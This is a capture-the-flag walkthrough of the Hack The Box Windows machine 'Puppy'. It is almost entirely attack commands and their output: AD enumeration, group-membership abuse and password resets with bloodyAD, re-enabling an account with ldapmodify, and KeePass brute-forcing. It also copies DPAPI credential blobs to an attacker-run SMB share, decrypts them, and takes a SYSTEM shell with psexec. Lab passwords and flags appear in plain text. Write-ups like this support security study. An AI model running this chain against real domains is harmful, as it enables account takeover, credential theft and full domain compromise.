---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - Kerberoasting
  - Bloodhound
  - DPAPI
  - Impacket-PsExec
  - RPCClient
  - KeePass4Brute
---
# Overview

| Name        | Puppy       |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
As is common in real life pentests, you will start the Puppy box with credentials for the following account: `levi.james` / `KingofAkron2025!`
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV -A 10.10.11.70
Host is up (0.37s latency).
Not shown: 985 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-08 21:57:44Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m56s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-09-08T22:00:07
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   364.63 ms 10.10.14.1
2   370.38 ms puppy.htb (10.10.11.70)
```
## RPCClient

```bash
❯ rpcclient 10.10.11.70 -U levi.james
Password for [WORKGROUP\levi.james]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```
# Enumeration
## SMBMAP

```bash
~/Hentai/HTB/puppy 24s ❯ smbmap -H 10.10.11.70 -u levi.james -p 'KingofAkron2025!'
[+] IP: 10.10.11.70:445 Name: puppy.htb                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
```

`DEV` is not accessable.
## Bloodhound

Add `dc.puppy.htb` to host file. Add `dc.puppy.htb` first before `puppy.htb` otherwise doesn't work.

```bash
❯ sudo ntpdate puppy.htb
2025-09-09 04:40:41.187534 (+0545) +0.007157 +/- 0.179743 puppy.htb 10.10.11.70 s1 no-leap

❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       at0m

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.11.221 2million.htb
10.10.11.81 cobblestone.htb
10.10.11.81 deploy.cobblestone.htb
10.10.11.81 vote.cobblestone.htb
10.10.11.81 mc.cobblestone.htb
10.10.11.70 dc.puppy.htb puppy.htb

❯ bloodhound-python -u 'levi.james' -p 'KingofAkron2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 01M 53S
INFO: Compressing output into 20250909043720_bloodhound.zip
```

![[puppy.png]]

```bash
❯ bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
[+] levi.james added to DEVELOPERS
```

Now we can use `DEV` share.
## SMB

```bash
❯ smbclient  //10.10.11.70/DEV -U levi.james
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 12:52:57 2025
  ..                                  D        0  Sat Mar  8 22:37:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 12:54:12 2025
  Projects                            D        0  Sat Mar  8 22:38:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 08:10:46 2025

                5080575 blocks of size 4096. 1615212 blocks available
smb: \> get recovery.kdbx
getting file \recovery.kdbx of size 2677 as recovery.kdbx (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)
```
## [KeePass4Brute](https://github.com/r3nt0n/keepass4brute)

```bash
❯ ./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 22 - Estimated time remaining: 64 weeks, 4 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

Unlock with password `liverpool`.

![[puppy2.png]]

We got creds:

```
adam.silver = HJKL2025!
ant.edwards = Antman2025!
jamie.williams = JamieLove2025!
samuel.blake = ILY2025!
steve.tucker = Steve2025!
```
## NXC

```bash
❯ nxc smb 10.10.11.70 -u users.txt -p pass.txt
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
```

`ant.edwards`/`Antman2025!` worked.
## Bloodhound (Edwards)

```bash
❯ bloodhound-python -u 'ant.edwards' -p 'Antman2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
ERROR: Unhandled exception in computer DC.PUPPY.HTB processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 986, in non_polling_read
    received = self._sock.recv(bytes_left)
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound/enumeration/computers.py", line 136, in process_computer
    unresolved = c.rpc_get_group_members(580, c.psremote)
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 795, in rpc_get_group_members
    raise e
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 732, in rpc_get_group_members
    resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, self.samname[:-1])
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/samr.py", line 2860, in hSamrLookupDomainInSamServer
    return dce.request(request)
           ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 861, in request
    answer = self.recv()
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1316, in recv
    response_data = self._transport.recv(forceRecv, count=MSRPCRespHeader._SIZE)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/transport.py", line 555, in recv
    return self.__smb_connection.readFile(self.__tid, self.__handle)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 572, in readFile
    bytesRead = self._SMBConnection.read_andx(treeId, fileId, offset, toRead)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 2065, in read_andx
    return self.read(tid, fid, offset, max_size, wait_answer)
           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1400, in read
    ans = self.recvSMB(packetID)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 515, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 917, in recv_packet
    data = self.__read(timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 1004, in __read
    data = self.read_function(4, timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 988, in non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 01M 00S
INFO: Compressing output into 20250909060424_bloodhound.zip
```

![[puppy3.png]]

Reset the password of Adam.

```bash
❯ bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password ADAM.SILVER Abc123456!
[+] Password changed successfully!
```

But trying to Evil-WinRM will show error because:

![[puppy4.png]]

`Enabled: FALSE`, That means the **`adam.silver` account is disabled in Active Directory**.
## Enabling `adam.silver` in AD using LDAPModify

```bash
❯ ldapmodify -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W << EOF
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
EOF

Enter LDAP Password: Antman2025!
modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"
```

```bash
❯ evil-winrm -i 10.10.11.70 -u 'adam.silver' -p 'Abc123456!'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
2d728f49f8c826bef5cf0a927cf61116
```
# Privilege Escalation

If you can't Evil-WinRM after certain time its because the password resets so of `adam.silver` so you will have to repeat the process from `bloodyAD` part.

```bash
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd c:\
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         7/24/2025  12:25 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---          3/8/2025   8:52 AM                Users
d-----         5/13/2025   4:40 PM                Windows


*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip


*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip

Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip

Info: Download successful!
```

Unzip it and:

```bash
❯ cd puppy

❯ ls
assets  images  index.html  nms-auth-config.xml.bak

❯ cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

We got creds `steph.cooper:ChefSteph2025!`.

```bash
❯ evil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper\Documents>
```
## DPAPI Creds

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> cd C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> dir -h


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> cd ../Protect
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect> ls


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107
```

Somehow normally downloading gives error. So start a SMB Server in Attack Machine.

```bash
❯ mkdir share

❯ impacket-smbserver share ./share -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.14.233\share\masterkey_blob
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\10.10.14.233\share\credential_blob
```
## Decrypting DPAPI

```bash
❯ impacket-dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

```
❯ impacket-dpapi credential -file credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

We got new creds `steph.cooper_adm:FivethChipOnItsWay2025!` most likely its the fucking Admin/.
## Impacket-PsExec

```bash
❯ impacket-psexec steph.cooper_adm:'FivethChipOnItsWay2025!'@10.10.11.70
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.11.70.....
[*] Found writable share ADMIN$
[*] Uploading file IDYmqrjA.exe
[*] Opening SVCManager on 10.10.11.70.....
[*] Creating service gWLX on 10.10.11.70.....
[*] Starting service gWLX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\Users\Administrator\Desktop\root.txt
b5914fa717e94dab14b286141b9a446e
```

---
